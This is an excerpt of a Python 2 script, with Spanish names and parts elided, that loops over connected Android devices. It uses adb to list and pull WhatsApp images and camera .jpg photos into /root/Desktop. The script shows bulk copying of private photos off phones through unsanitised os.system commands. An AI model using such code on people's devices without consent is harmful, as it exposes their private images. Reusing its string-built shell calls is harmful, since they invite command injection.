...
carpetas = ["/storage/sdcard0/WhatsApp/Media/WhatsApp\ Images/","/sdcard/DCIM/Camera/","/sdcard/DCIM/Camara/","/storage/external_SD/DCIM/","/storage/external_SD/WhatsApp/Media/WhatsApp\ Images/","/mnt/sdcard/DCIM/Camara/","/mnt/sdcard/DCIM/Camera/","/mnt/sdcard/WhatsApp/Media/WhatsApp\ Images/","/storage/extSdCard/DCIM/Camera/","/storage/extSdCard/DCIM/Camara/"]
			...
			try:
				...
				for carpeta in carpetas:
						if "WhatsApp" in carpeta:
							try:
								print "adb -s "+device+" pull "+carpeta+" /root/Desktop/"+device
								os.system("adb -s "+device+" pull "+carpeta+" /root/Desktop/"+device)
							except:
								raise
						else:
							archivos = []
							#print "adb -s "+device+" shell ls "+carpeta+" > nombres.txt"
							os.system("adb -s "+device+" shell ls "+carpeta+" > nombres.txt")
							print "Ejecutando: "+"adb -s "+device+" shell ls "+carpeta+" > nombres.txt"
							...
							for archivo in archivos:
								...
								if ".jpg" in archivo:
									...
									try:
										#print device
										print "Ejecutando: "+"adb -s "+device+" pull "+carpeta+archivo.strip()+" /root/Desktop/"+device
										os.system("adb -s "+device+" pull "+carpeta+archivo.strip()+" /root/Desktop/"+device)
									except:
